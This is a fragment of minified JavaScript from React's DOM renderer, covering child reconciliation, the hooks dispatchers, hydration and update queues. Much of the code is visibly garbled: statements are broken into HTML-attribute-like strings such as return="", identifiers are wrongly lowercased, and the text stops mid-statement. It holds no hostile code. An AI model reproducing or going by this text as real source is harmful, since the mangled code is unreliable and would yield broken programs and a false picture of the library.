t.index=r,e?null!==(r=t.alternate)?(r=r.index)<n?(t.effecttag=2,n):r:(t.effecttag=2,n):n}function a(t){return="" e&&null="==t.alternate&&(t.effectTag=2),t}function" u(e,t,n,r){return="" null="==t||6!==t.tag?((t=Kr(n,e.mode,r)).return=e,t):((t=o(t,n)).return=e,t)}function" c(e,t,n,r){return="" null!="=t&&t.elementType===n.type?((r=o(t,n.props)).ref=so(e,t,n),r.return=e,r):((r=Qr(n.type,n.key,n.props,null,e.mode,r)).ref=so(e,t,n),r.return=e,r)}function" s(e,t,n,r){return="" f(e,t,n,r,i){return="" d(e,t,n){if("string"="=typeof" t||"number"="=typeof" t)return(t="Kr(""+t,e.mode,n)).return=e,t;if("object"==typeof" t&&null!="=t){switch(t.$$typeof){case" ye:return(n="Qr(t.type,t.key,t.props,null,e.mode,n)).ref=so(e,null,t),n.return=e,n;case" qe:return(t="Gr(t,e.mode,n)).return=e,t}if(co(t)||lt(t))return(t=Yr(t,e.mode,n,null)).return=e,t;fo(e,t)}return" null}function="" p(e,t,n,r){var="" o="null!==t?t.key:null;if("string"==typeof" n||"number"="=typeof" n)return="" n&&null!="=n){switch(n.$$typeof){case" ye:return="" n.key="==o?n.type===Ke?f(e,t,n.props.children,r,o):c(e,t,n,r):null;case" qe:return="" m(e,t,n,r,o){if("string"="=typeof" r||"number"="=typeof" r)return="" u(t,e="e.get(n)||null,""+r,o);if("object"==typeof" r&&null!="=r){switch(r.$$typeof){case" e="e.get(null===r.key?n:r.key)||null,r.type===Ke?f(t,e,r.props.children,o,r.key):c(t,e,r,o);case" s(t,e="e.get(null===r.key?n:r.key)||null,r,o)}if(co(r)||lt(r))return" f(t,e="e.get(n)||null,r,o,null);fo(t,r)}return" h(o,l,a,u){for(var="" c="null,s=null,f=l,h=l=0,y=null;null!==f&&h<a.length;h++){f.index">h?(y=f,f=null):y=f.sibling;var v=p(o,f,a[h],u);if(null===v){null===f&&(f=y);break}e&&f&&null===v.alternate&&t(o,f),l=i(v,l,h),null===s?c=v:s.sibling=v,s=v,f=y}if(h===a.length)return n(o,f),c;if(null===f){for(;h<a.length;h++)(f=d(o,a[h],u))&&(l=i(f,l,h),null===s?c=f:s.sibling=f,s=f);return c}for(f="r(o,f);h<a.length;h++)(y=m(f,o,h,a[h],u))&&(e&&null!==y.alternate&&f.delete(null===y.key?h:y.key),l=i(y,l,h),null===s?c=y:s.sibling=y,s=y);return" e&&f.foreach(function(e){return="" t(o,e)}),c}function="" y(o,a,u,c){var="" s="lt(u);"function"!=typeof" s&&l("150"),null="=(u=s.call(u))&&l("151");for(var" f="s=null,h=a,y=a=0,v=null,g=u.next();null!==h&&!g.done;y++,g=u.next()){h.index">y?(v=h,h=null):v=h.sibling;var b=p(o,h,g.value,c);if(null===b){h||(h=v);break}e&&h&&null===b.alternate&&t(o,h),a=i(b,a,y),null===f?s=b:f.sibling=b,f=b,h=v}if(g.done)return n(o,h),s;if(null===h){for(;!g.done;y++,g=u.next())null!==(g=d(o,g.value,c))&&(a=i(g,a,y),null===f?s=g:f.sibling=g,f=g);return s}for(h=r(o,h);!g.done;y++,g=u.next())null!==(g=m(h,o,y,g.value,c))&&(e&&null!==g.alternate&&h.delete(null===g.key?y:g.key),a=i(g,a,y),null===f?s=g:f.sibling=g,f=g);return e&&h.forEach(function(e){return t(o,e)}),s}return function(e,r,i,u){var c="object"==typeof i&&null!==i&&i.type===Ke&&null===i.key;c&&(i=i.props.children);var s="object"==typeof i&&null!==i;if(s)switch(i.$$typeof){case Ye:e:{for(s=i.key,c=r;null!==c;){if(c.key===s){if(7===c.tag?i.type===Ke:c.elementType===i.type){n(e,c.sibling),(r=o(c,i.type===Ke?i.props.children:i.props)).ref=so(e,c,i),r.return=e,e=r;break e}n(e,c);break}t(e,c),c=c.sibling}i.type===Ke?((r=Yr(i.props.children,e.mode,u,i.key)).return=e,e=r):((u=Qr(i.type,i.key,i.props,null,e.mode,u)).ref=so(e,r,i),u.return=e,e=u)}return a(e);case qe:e:{for(c=i.key;null!==r;){if(r.key===c){if(4===r.tag&&r.stateNode.containerInfo===i.containerInfo&&r.stateNode.implementation===i.implementation){n(e,r.sibling),(r=o(r,i.children||[])).return=e,e=r;break e}n(e,r);break}t(e,r),r=r.sibling}(r=Gr(i,e.mode,u)).return=e,e=r}return a(e)}if("string"==typeof i||"number"==typeof i)return i=""+i,null!==r&&6===r.tag?(n(e,r.sibling),(r=o(r,i)).return=e,e=r):(n(e,r),(r=Kr(i,e.mode,u)).return=e,e=r),a(e);if(co(i))return h(e,r,i,u);if(lt(i))return y(e,r,i,u);if(s&&fo(e,i),void 0===i&&!c)switch(e.tag){case 1:case 0:l("152",(u=e.type).displayName||u.name||"Component")}return n(e,r)}}var mo=po(!0),ho=po(!1),yo={},vo={current:yo},go={current:yo},bo={current:yo};function xo(e){return e===yo&&l("174"),e}function wo(e,t){Cr(bo,t),Cr(go,e),Cr(vo,yo);var n=t.nodeType;switch(n){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:tr(null,"");break;default:t=tr(t=(n=8===n?t.parentNode:t).namespaceURI||null,n=n.tagName)}Er(vo),Cr(vo,t)}function ko(e){Er(vo),Er(go),Er(bo)}function _o(e){xo(bo.current);var t=xo(vo.current),n=tr(t,e.type);t!==n&&(Cr(go,e),Cr(vo,n))}function So(e){go.current===e&&(Er(vo),Er(go))}var To=0,Eo=2,Co=4,Po=8,Oo=16,No=32,Mo=64,Ro=128,Io=Be.ReactCurrentDispatcher,Do=0,jo=null,$o=null,Lo=null,zo=null,Uo=null,Fo=null,Ao=0,Wo=null,Vo=0,Bo=!1,Ho=null,Qo=0;function Yo(){l("321")}function qo(e,t){if(null===t)return!1;for(var n=0;n<t.length&&n<e.length;n++)if(!jt(e[n],t[n]))return!1;return!0}function ko(e,t,n,r,o,i){if(do="i,jo=t,Lo=null!==e?e.memoizedState:null,Io.current=null===Lo?ui:ci,t=n(r,o),Bo){do{Bo=!1,Qo+=1,Lo=null!==e?e.memoizedState:null,Fo=zo,Wo=Uo=$o=null,Io.current=ci,t=n(r,o)}while(Bo);Ho=null,Qo=0}return" io.current="ai,(e=jo).memoizedState=zo,e.expirationTime=Ao,e.updateQueue=Wo,e.effectTag|=Vo,e=null!==$o&&null!==$o.next,Do=0,Fo=Uo=zo=Lo=$o=jo=null,Ao=0,Wo=null,Vo=0,e&&l("300"),t}function" go(){io.current="ai,Do=0,Fo=Uo=zo=Lo=$o=jo=null,Ao=0,Wo=null,Vo=0,Bo=!1,Ho=null,Qo=0}function" xo(){var="" e="{memoizedState:null,baseState:null,queue:null,baseUpdate:null,next:null};return" null="==Uo?zo=Uo=e:Uo=Uo.next=e,Uo}function" jo(){if(null!="=Fo)Fo=(Uo=Fo).next,Lo=null!==($o=Lo)?$o.next:null;else{null===Lo&&l("310");var" uo}function="" zo(e,t){return"function"="=typeof" t?t(e):t}function="" ei(e){var="" t="Jo(),n=t.queue;if(null===n&&l("311"),n.lastRenderedReducer=e,0<Qo){var" r="n.dispatch;if(null!==Ho){var" o="Ho.get(n);if(void" 0!="=o){Ho.delete(n);var" i="t.memoizedState;do{i=e(i,o.action),o=o.next}while(null!==o);return" jt(i,t.memoizedstate)||(xi="!0),t.memoizedState=i,t.baseUpdate===n.last&&(t.baseState=i),n.lastRenderedState=i,[i,r]}}return[t.memoizedState,r]}r=n.last;var" a="t.baseUpdate;if(i=t.baseState,null!==a?(null!==r&&(r.next=null),r=a.next):r=null!==r?r.next:null,null!==r){var" u="o=null,c=r,s=!1;do{var" f="c.expirationTime;f<Do?(s||(s=!0,u=a,o=i),f">Ao&&(Ao=f)):i=c.eagerReducer===e?c.eagerState:e(i,c.action),a=c,c=c.next}while(null!==c&&c!==r);s||(u=a,o=i),Jt(i,t.memoizedState)||(xi=!0),t.memoizedState=i,t.baseUpdate=u,t.baseState=o,n.lastRenderedState=i}return[t.memoizedState,n.dispatch]}function ti(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},null===Wo?(Wo={lastEffect:null}).lastEffect=e.next=e:null===(t=Wo.lastEffect)?Wo.lastEffect=e.next=e:(n=t.next,t.next=e,e.next=n,Wo.lastEffect=e),e}function ni(e,t,n,r){var o=Xo();Vo|=e,o.memoizedState=ti(t,n,void 0,void 0===r?null:r)}function ri(e,t,n,r){var o=Jo();r=void 0===r?null:r;var i=void 0;if(null!==$o){var l=$o.memoizedState;if(i=l.destroy,null!==r&&qo(r,l.deps))return void ti(To,n,i,r)}Vo|=e,o.memoizedState=ti(t,n,i,r)}function oi(e,t){return"function"==typeof t?(e=e(),t(e),function(){t(null)}):null!==t&&void 0!==t?(e=e(),t.current=e,function(){t.current=null}):void 0}function ii(){}function li(e,t,n){25>Qo||l("301");var r=e.alternate;if(e===jo||null!==r&&r===jo)if(Bo=!0,e={expirationTime:Do,action:n,eagerReducer:null,eagerState:null,next:null},null===Ho&&(Ho=new Map),void 0===(n=Ho.get(t)))Ho.set(t,e);else{for(t=n;null!==t.next;)t=t.next;t.next=e}else{Al();var o=xa(),i={expirationTime:o=Yl(o,e),action:n,eagerReducer:null,eagerState:null,next:null},a=t.last;if(null===a)i.next=i;else{var u=a.next;null!==u&&(i.next=u),a.next=i}if(t.last=i,0===e.expirationTime&&(null===r||0===r.expirationTime)&&null!==(r=t.lastRenderedReducer))try{var c=t.lastRenderedState,s=r(c,n);if(i.eagerReducer=r,i.eagerState=s,Jt(s,c))return}catch(e){}Gl(e,o)}}var ai={readContext:Fi,useCallback:Yo,useContext:Yo,useEffect:Yo,useImperativeHandle:Yo,useLayoutEffect:Yo,useMemo:Yo,useReducer:Yo,useRef:Yo,useState:Yo,useDebugValue:Yo},ui={readContext:Fi,useCallback:function(e,t){return Xo().memoizedState=[e,void 0===t?null:t],e},useContext:Fi,useEffect:function(e,t){return ni(516,Ro|Mo,e,t)},useImperativeHandle:function(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,ni(4,Co|No,oi.bind(null,t,e),n)},useLayoutEffect:function(e,t){return ni(4,Co|No,e,t)},useMemo:function(e,t){var n=Xo();return t=void 0===t?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=Xo();return t=void 0!==n?n(t):t,r.memoizedState=r.baseState=t,e=(e=r.queue={last:null,dispatch:null,lastRenderedReducer:e,lastRenderedState:t}).dispatch=li.bind(null,jo,e),[r.memoizedState,e]},useRef:function(e){return e={current:e},Xo().memoizedState=e},useState:function(e){var t=Xo();return"function"==typeof e&&(e=e()),t.memoizedState=t.baseState=e,e=(e=t.queue={last:null,dispatch:null,lastRenderedReducer:Zo,lastRenderedState:e}).dispatch=li.bind(null,jo,e),[t.memoizedState,e]},useDebugValue:ii},ci={readContext:Fi,useCallback:function(e,t){var n=Jo();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&qo(t,r[1])?r[0]:(n.memoizedState=[e,t],e)},useContext:Fi,useEffect:function(e,t){return ri(516,Ro|Mo,e,t)},useImperativeHandle:function(e,t,n){return n=null!==n&&void 0!==n?n.concat([e]):null,ri(4,Co|No,oi.bind(null,t,e),n)},useLayoutEffect:function(e,t){return ri(4,Co|No,e,t)},useMemo:function(e,t){var n=Jo();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&qo(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)},useReducer:ei,useRef:function(){return Jo().memoizedState},useState:function(e){return ei(Zo)},useDebugValue:ii},si=null,fi=null,di=!1;function pi(e,t){var n=Vr(5,null,null,0);n.elementType="DELETED",n.type="DELETED",n.stateNode=t,n.return=e,n.effectTag=8,null!==e.lastEffect?(e.lastEffect.nextEffect=n,e.lastEffect=n):e.firstEffect=e.lastEffect=n}function mi(e,t){switch(e.tag){case 5:var n=e.type;return null!==(t=1!==t.nodeType||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t)&&(e.stateNode=t,!0);case 6:return null!==(t=""===e.pendingProps||3!==t.nodeType?null:t)&&(e.stateNode=t,!0);case 13:default:return!1}}function hi(e){if(di){var t=fi;if(t){var n=t;if(!mi(e,t)){if(!(t=kr(n))||!mi(e,t))return e.effectTag|=2,di=!1,void(si=e);pi(si,n)}si=e,fi=_r(t)}else e.effectTag|=2,di=!1,si=e}}function yi(e){for(e=e.return;null!==e&&5!==e.tag&&3!==e.tag&&18!==e.tag;)e=e.return;si=e}function vi(e){if(e!==si)return!1;if(!di)return yi(e),di=!0,!1;var t=e.type;if(5!==e.tag||"head"!==t&&"body"!==t&&!vr(t,e.memoizedProps))for(t=fi;t;)pi(e,t),t=kr(t);return yi(e),fi=si?kr(e.stateNode):null,!0}function gi(){fi=si=null,di=!1}var bi=Be.ReactCurrentOwner,xi=!1;function wi(e,t,n,r){t.child=null===e?ho(t,null,n,r):mo(t,e.child,n,r)}function ki(e,t,n,r,o){n=n.render;var i=t.ref;return Ui(t,o),r=Ko(e,t,n,r,i,o),null===e||xi?(t.effectTag|=1,wi(e,t,r,o),t.child):(t.updateQueue=e.updateQueue,t.effectTag&=-517,e.expirationTime<=o&&(e.expirationtime=0),mi(e,t,o))}function _i(e,t,n,r,o,i){if(null="==e){var" l="n.type;return"function"!=typeof" l||br(l)||void="" 0!="=l.defaultProps||null!==n.compare||void" si(e,t,n,r,o,i){return="" null!="=e&&en(e.memoizedProps,r)&&e.ref===t.ref&&(xi=!1,o<i)?Mi(e,t,i):Ei(e,t,n,r,i)}function" ti(e,t){var="" n="t.ref;(null===e&&null!==n||null!==e&&e.ref!==n)&&(t.effectTag|=128)}function" ei(e,t,n,r,o){var="" i="Ir(n)?Mr:Or.current;return" ci(e,t,n,r,o){if(ir(n)){var="" if(null="==e){var" u="l.context,c=n.contextType;"object"==typeof" c&&null!="=c?c=Fi(c):c=Rr(t,c=Ir(n)?Mr:Or.current);var" s="n.getDerivedStateFromProps,f="function"==typeof" s||"function"="=typeof" l.getsnapshotbeforeupdate;f||"function"!="typeof" l.unsafe_componentwillreceiveprops&&"function"!="typeof" l.componentwillreceiveprops||(a!="=r||u!==c)&&ao(t,l,r,c),Hi=!1;var" d="t.memoizedState;u=l.state=d;var" p="t.updateQueue;null!==p&&(el(t,p,r,l,o),u=t.memoizedState),a!==r||d!==u||Nr.current||Hi?("function"==typeof" s&&(ro(t,n,s,r),u="t.memoizedState),(a=Hi||io(t,n,a,r,d,u,c))?(f||"function"!=typeof" l.unsafe_componentwillmount&&"function"!="typeof" l.componentwillmount||("function"="=typeof" l.componentwillmount&&l.componentwillmount(),"function"="=typeof" l.unsafe_componentwillmount&&l.unsafe_componentwillmount()),"function"="=typeof" l.componentdidmount&&(t.effecttag|="4)):("function"==typeof" l.getsnapshotbeforeupdate)||"function"!="typeof" s&&(ro(t,n,s,r),d="t.memoizedState),(s=Hi||io(t,n,a,r,u,d,c))?(f||"function"!=typeof" l.unsafe_componentwillupdate&&"function"!="typeof" l.componentwillupdate||("function"="=typeof" l.componentwillupdate&&l.componentwillupdate(r,d,c),"function"="=typeof" l.unsafe_componentwillupdate&&l.unsafe_componentwillupdate(r,d,c)),"function"="=typeof" l.componentdidupdate&&(t.effecttag|="4),"function"==typeof" l.getsnapshotbeforeupdate&&(t.effecttag|="256)):("function"!=typeof" l.componentdidupdate||a="==e.memoizedProps&&u===e.memoizedState||(t.effectTag|=4),"function"!=typeof" l.getsnapshotbeforeupdate||a="==e.memoizedProps&&u===e.memoizedState||(t.effectTag|=256),t.memoizedProps=r,t.memoizedState=d),l.props=r,l.state=d,l.context=c,r=s):("function"!=typeof" pi(e,t,n,r,i,o)}function="" pi(e,t,n,r,o,i){ti(e,t);var="" o&&ur(t,n,!1),mi(e,t,i);r="t.stateNode,bi.current=t;var" a="l&&"function"!=typeof" n.getderivedstatefromerror?null:r.render();return="" t.effecttag|="1,null!==e&&l?(t.child=mo(t,e.child,null,i),t.child=mo(t,null,a,i)):wi(e,t,a,i),t.memoizedState=r.state,o&&Ur(t,n,!0),t.child}function" oi(e){var="" t="e.stateNode;t.pendingContext?$r(0,t.pendingContext,t.pendingContext!==t.context):t.context&&$r(0,t.context,!1),wo(e,t.containerInfo)}function" ni(e,t,n){var="" r="t.mode,o=t.pendingProps,i=t.memoizedState;if(0==(64&t.effectTag)){i=null;var" t.memoizedstate="i,t.child=n,r}function" mi(e,t,n){if(null!="=e&&(t.contextDependencies=e.contextDependencies),t.childExpirationTime<n)return" null;if(null!="=e&&t.child!==e.child&&l("153"),null!==t.child){for(n=Hr(e=t.child,e.pendingProps,e.expirationTime),t.child=n,n.return=t;null!==e.sibling;)e=e.sibling,(n=n.sibling=Hr(e,e.pendingProps,e.expirationTime)).return=t;n.sibling=null}return" t.child}function="" ri(e,t,n){var="" if(r<n){switch(xi="!1,t.tag){case" 3:oi(t),gi();break;case="" 5:_o(t);break;case="" 1:ir(t.type)&&zr(t);break;case="" 4:wo(t,t.statenode.containerinfo);break;case="" 10:li(t,t.memoizedprops.value);break;case="" 13:if(null!="=t.memoizedState)return">=n?Ni(e,t,n):null!==(t=Mi(e,t,n))?t.sibling:null}return Mi(e,t,n)}}else xi=!1;switch(t.expirationTime=0,t.tag){case 2:r=t.elementType,null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),e=t.pendingProps;var o=Rr(t,Or.current);if(Ui(t,n),o=Ko(null,t,r,e,o,n),t.effectTag|=1,"object"==typeof o&&null!==o&&"function"==typeof o.render&&void 0===o.$$typeof){if(t.tag=1,Go(),Ir(r)){var i=!0;zr(t)}else i=!1;t.memoizedState=null!==o.state&&void 0!==o.state?o.state:null;var a=r.getDerivedStateFromProps;"function"==typeof a&&ro(t,r,a,e),o.updater=oo,t.stateNode=o,o._reactInternalFiber=t,uo(t,r,e,n),t=Pi(null,t,r,!0,i,n)}else t.tag=0,wi(null,t,o,n),t=t.child;return t;case 16:switch(o=t.elementType,null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),i=t.pendingProps,e=function(e){var t=e._result;switch(e._status){case 1:return t;case 2:case 0:throw t;default:switch(e._status=0,(t=(t=e._ctor)()).then(function(t){0===e._status&&(t=t.default,e._status=1,e._result=t)},function(t){0===e._status&&(e._status=2,e._result=t)}),e._status){case 1:return e._result;case 2:throw e._result}throw e._result=t,t}}(o),t.type=e,o=t.tag=function(e){if("function"==typeof e)return Br(e)?1:0;if(void 0!==e&&null!==e){if((e=e.$$typeof)===tt)return 11;if(e===rt)return 14}return 2}(e),i=to(e,i),a=void 0,o){case 0:a=Ei(null,t,e,i,n);break;case 1:a=Ci(null,t,e,i,n);break;case 11:a=ki(null,t,e,i,n);break;case 14:a=_i(null,t,e,to(e.type,i),r,n);break;default:l("306",e,"")}return a;case 0:return r=t.type,o=t.pendingProps,Ei(e,t,r,o=t.elementType===r?o:to(r,o),n);case 1:return r=t.type,o=t.pendingProps,Ci(e,t,r,o=t.elementType===r?o:to(r,o),n);case 3:return Oi(t),null===(r=t.updateQueue)&&l("282"),o=null!==(o=t.memoizedState)?o.element:null,el(t,r,t.pendingProps,null,n),(r=t.memoizedState.element)===o?(gi(),t=Mi(e,t,n)):(o=t.stateNode,(o=(null===e||null===e.child)&&o.hydrate)&&(fi=_r(t.stateNode.containerInfo),si=t,o=di=!0),o?(t.effectTag|=2,t.child=ho(t,null,r,n)):(wi(e,t,r,n),gi()),t=t.child),t;case 5:return _o(t),null===e&&hi(t),r=t.type,o=t.pendingProps,i=null!==e?e.memoizedProps:null,a=o.children,vr(r,o)?a=null:null!==i&&vr(r,i)&&(t.effectTag|=16),Ti(e,t),1!==n&&1&t.mode&&o.hidden?(t.expirationTime=t.childExpirationTime=1,t=null):(wi(e,t,a,n),t=t.child),t;case 6:return null===e&&hi(t),null;case 13:return Ni(e,t,n);case 4:return wo(t,t.stateNode.containerInfo),r=t.pendingProps,null===e?t.child=mo(t,null,r,n):wi(e,t,r,n),t.child;case 11:return r=t.type,o=t.pendingProps,ki(e,t,r,o=t.elementType===r?o:to(r,o),n);case 7:return wi(e,t,t.pendingProps,n),t.child;case 8:case 12:return wi(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,o=t.pendingProps,a=t.memoizedProps,Li(t,i=o.value),null!==a){var u=a.value;if(0===(i=Jt(u,i)?0:0|("function"==typeof r._calculateChangedBits?r._calculateChangedBits(u,i):1073741823))){if(a.children===o.children&&!Nr.current){t=Mi(e,t,n);break e}}else for(null!==(u=t.child)&&(u.return=t);null!==u;){var c=u.contextDependencies;if(null!==c){a=u.child;for(var s=c.first;null!==s;){if(s.context===r&&0!=(s.observedBits&i)){1===u.tag&&((s=qi(n)).tag=Vi,Gi(u,s)),u.expirationTime<n&&(u.expirationtime=n),null!==(s=u.alternate)&&s.expirationtime<n&&(s.expirationtime=n),s=n;for(var f="u.return;null!==f;){var" d="f.alternate;if(f.childExpirationTime<s)f.childExpirationTime=s,null!==d&&d.childExpirationTime<s&&(d.childExpirationTime=s);else{if(!(null!==d&&d.childExpirationTime<s))break;d.childExpirationTime=s}f=f.return}c.expirationTime<n&&(c.expirationTime=n);break}s=s.next}}else" a="10===u.tag&&u.type===t.type?null:u.child;if(null!==a)a.return=u;else" for(a="u;null!==a;){if(a===t){a=null;break}if(null!==(u=a.sibling)){u.return=a.return,a=u;break}a=a.return}u=a}}wi(e,t,o.children,n),t=t.child}return" t;case="" 9:return="" o="t.type,r=(i=t.pendingProps).children,Ui(t,n),r=r(o=Fi(o,i.unstable_observedBits)),t.effectTag|=1,wi(e,t,r,n),t.child;case" 14:return="" i="to(o=t.type,t.pendingProps),_i(e,t,o,i=to(o.type,i),r,n);case" 15:return="" si(e,t,t.type,t.pendingprops,r,n);case="" 17:return="" r="t.type,o=t.pendingProps,o=t.elementType===r?o:to(r,o),null!==e&&(e.alternate=null,t.alternate=null,t.effectTag|=2),t.tag=1,Ir(r)?(e=!0,zr(t)):e=!1,Ui(t,n),lo(t,r,o),uo(t,r,o,n),Pi(null,t,r,!0,e,n)}l("156")}var" ii="{current:null},Di=null,ji=null,$i=null;function" li(e,t){var="" n="e.type._context;Cr(Ii,n._currentValue),n._currentValue=t}function" zi(e){var="" t="Ii.current;Er(Ii),e.type._context._currentValue=t}function" ui(e,t){di="e,$i=ji=null;var">=t&&(xi=!0),e.contextDependencies=null}function Fi(e,t){return $i!==e&&!1!==t&&0!==t&&("number"==typeof t&&1073741823!==t||($i=e,t=1073741823),t={context:e,observedBits:t,next:null},null===ji?(null===Di&&l("308"),ji=t,Di.contextDependencies={first:t,expirationTime:0}):ji=ji.next=t),e._currentValue}var Ai=0,Wi=1,Vi=2,Bi=3,Hi=!1;function Qi(e){return{baseState:e,firstUpdate:null,lastUpdate:null,firstCapturedUpdate:null,lastCapturedUpdate:null,firstEffect:null,lastEffect:null,firstCapturedEffect:null,lastCapturedEffect:null}}function Yi(e){return{baseState:e.baseState,firstUpdate:e.firstUpdate,lastUpdate:e.lastUpdate,firstCapturedUpdate:null,lastCapturedUpdate:null,firstEffect:null,lastEffect:null,firstCapturedEffect:null,lastCapturedEffect:null}}function qi(e){return{expirationTime:e,tag:Ai,payload:null,callback:null,next:null,nextEffect:null}}function Ki(e,t){null===e.lastUpdate?e.firstUpdate=e.lastUpdate=t:(e.lastUpdate.next=t,e.lastUpdate=t)}function Gi(e,t){var n=e.alternate;if(null===n){var r=e.updateQueue,o=null;null===r&&(r=e.updateQueue=Qi(e.memoizedState))}else r=e.updateQueue,o=n.updateQueue,null===r?null===o?(r=e.updateQueue=Qi(e.memoizedState),o=n.updateQueue=Qi(n.memoizedState)):r=e.updateQueue=Yi(o):null===o&&(o=n.updateQueue=Yi(r));null===o||r===o?Ki(r,t):null===r.lastUpdate||null===o.lastUpdate?(Ki(r,t),Ki(o,t)):(Ki(r,t),o.lastUpdate=t)}function Xi(e,t){var n=e.updateQueue;null===(n=null===n?e.updateQueue=Qi(e.memoizedState):Ji(e,n)).lastCapturedUpdate?n.firstCapturedUpdate=n.lastCapturedUpdate=t:(n.lastCapturedUpdate.next=t,n.lastCapturedUpdate=t)}function Ji(e,t){var n=e.alternate;return null!==n&&t===n.updateQueue&&(t=e.updateQueue=Yi(t)),t}function Zi(e,t,n,r,i,l){switch(n.tag){case Wi:return"function"==typeof(e=n.payload)?e.call(l,r,i):e;case Bi:e.effectTag=-2049&e.effectTag|64;case Ai:if(null===(i="function"==typeof(e=n.payload)?e.call(l,r,i):e)||void 0===i)break;return o({},r,i);case Vi:Hi=!0}return r}function el(e,t,n,r,o){Hi=!1;for(var i=(t=Ji(e,t)).baseState,l=null,a=0,u=t.firstUpdate,c=i;null!==u;){var s=u.expirationTime;s<o?(null===l&&(l=u,i=c),a<s&&(a=s)):(c=zi(e,0,u,c,n,r),null!==u.callback&&(e.effecttag|=32,u.nexteffect=null,null===t.lasteffect?t.firsteffect=t.lasteffect=u:(t.lasteffect.nexteffect=u,t.lasteffect=u))),u=u.next}for(s=null,u=t.firstcapturedupdate;null!==u;){var 5="==e.tag||3===e.tag||4===e.tag}function" f="u.expirationTime;f<o?(null===s&&(s=u,null===l&&(i=c)),a<f&&(a=f)):(c=Zi(e,0,u,c,n,r),null!==u.callback&&(e.effectTag|=32,u.nextEffect=null,null===t.lastCapturedEffect?t.firstCapturedEffect=t.lastCapturedEffect=u:(t.lastCapturedEffect.nextEffect=u,t.lastCapturedEffect=u))),u=u.next}null===l&&(t.lastUpdate=null),null===s?t.lastCapturedUpdate=null:e.effectTag|=32,null===l&&null===s&&(i=c),t.baseState=i,t.firstUpdate=l,t.firstCapturedUpdate=s,e.expirationTime=a,e.memoizedState=c}function" tl(e,t,n){null!="=t.firstCapturedUpdate&&(null!==t.lastUpdate&&(t.lastUpdate.next=t.firstCapturedUpdate,t.lastUpdate=t.lastCapturedUpdate),t.firstCapturedUpdate=t.lastCapturedUpdate=null),nl(t.firstEffect,n),t.firstEffect=t.lastEffect=null,nl(t.firstCapturedEffect,n),t.firstCapturedEffect=t.lastCapturedEffect=null}function" nl(e,t){for(;null!="=e;){var" n="e.callback;if(null!==n){e.callback=null;var" r="t;"function"!=typeof" n&&l("191",n),n.call(r)}e="e.nextEffect}}function" rl(e,t){return{value:e,source:t,stack:ut(t)}}function="" ol(e){e.effecttag|="4}var" il="void" 0,ll="void" 0,al="void" 0,ul="void" 0;il="function(e,t){for(var" if(4!="=n.tag&&null!==n.child){n.child.return=n,n=n.child;continue}if(n===t)break;for(;null===n.sibling;){if(null===n.return||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}},ll=function(){},al=function(e,t,n,r,i){var" l="e.memoizedProps;if(l!==r){var" a="t.stateNode;switch(xo(vo.current),e=null,n){case"input":l=bt(a,l),r=bt(a,r),e=[];break;case"option":l=Yn(a,l),r=Yn(a,r),e=[];break;case"select":l=o({},l,{value:void" 0}),r="o({},r,{value:void" 0}),e="[];break;case"textarea":l=Kn(a,l),r=Kn(a,r),e=[];break;default:"function"!=typeof" l.onclick&&"function"="=typeof" r.onclick&&(a.onclick="pr)}sr(n,r),a=n=void" 0;var="" u="null;for(n" in="" l)if(!r.hasownproperty(n)&&l.hasownproperty(n)&&null!="l[n])if("style"===n){var" c="l[n];for(a" c)c.hasownproperty(a)&&(u||(u="{}),u[a]="")}else"dangerouslySetInnerHTML"!==n&&"children"!==n&&"suppressContentEditableWarning"!==n&&"suppressHydrationWarning"!==n&&"autoFocus"!==n&&(b.hasOwnProperty(n)?e||(e=[]):(e=e||[]).push(n,null));for(n" r){var="" s="r[n];if(c=null!=l?l[n]:void" 0,r.hasownproperty(n)&&s!="=c&&(null!=s||null!=c))if("style"===n)if(c){for(a" c)!c.hasownproperty(a)||s&&s.hasownproperty(a)||(u||(u="{}),u[a]="");for(a" s)s.hasownproperty(a)&&c[a]!="=s[a]&&(u||(u={}),u[a]=s[a])}else" u||(e||(e="[]),e.push(n,u)),u=s;else"dangerouslySetInnerHTML"===n?(s=s?s.__html:void" 0,c="c?c.__html:void" 0,null!="s&&c!==s&&(e=e||[]).push(n,""+s)):"children"===n?c===s||"string"!=typeof" s&&"number"!="typeof" s||(e="e||[]).push(n,""+s):"suppressContentEditableWarning"!==n&&"suppressHydrationWarning"!==n&&(b.hasOwnProperty(n)?(null!=s&&dr(i,n),e||c===s||(e=[])):(e=e||[]).push(n,s))}u&&(e=e||[]).push("style",u),i=e,(t.updateQueue=i)&&ol(t)}},ul=function(e,t,n,r){n!==r&&ol(t)};var" cl="function" =="typeof" weakset?weakset:set;function="" sl(e,t){var="" e})}}function="" fl(e){var="" t="e.ref;if(null!==t)if("function"==typeof" t)try{t(null)}catch(t){ql(e,t)}else="" t.current="null}function" dl(e,t,n){if(null!="=(n=null!==(n=n.updateQueue)?n.lastEffect:null)){var" o="r.destroy;r.destroy=void" 0,void="" 0!="=o&&o()}(r.tag&t)!==To&&(o=r.create,r.destroy=o()),r=r.next}while(r!==n)}}function" pl(e){switch("function"="=typeof" ar&&ar(e),e.tag){case="" 0:case="" 11:case="" 14:case="" 15:var="" 1:if(fl(e),"function"="=typeof(t=e.stateNode).componentWillUnmount)try{t.props=e.memoizedProps,t.state=e.memoizedState,t.componentWillUnmount()}catch(t){Ql(e,t)}break;case" 5:fl(e);break;case="" 4:yl(e)}}function="" ml(e){return="" hl(e){e:{for(var="" e}t="t.return}l("160"),n=void" 0}var="" 0;switch(n.tag){case="" 5:t="n.stateNode,r=!1;break;case" 3:case="" 4:t="n.stateNode.containerInfo,r=!0;break;default:l("161")}16&n.effectTag&&(or(t,""),n.effectTag&=-17);e:t:for(n=e;;){for(;null===n.sibling;){if(null===n.return||ml(n.return)){n=null;break" e}n="n.return}for(n.sibling.return=n.return,n=n.sibling;5!==n.tag&&6!==n.tag&&18!==n.tag;){if(2&n.effectTag)continue" 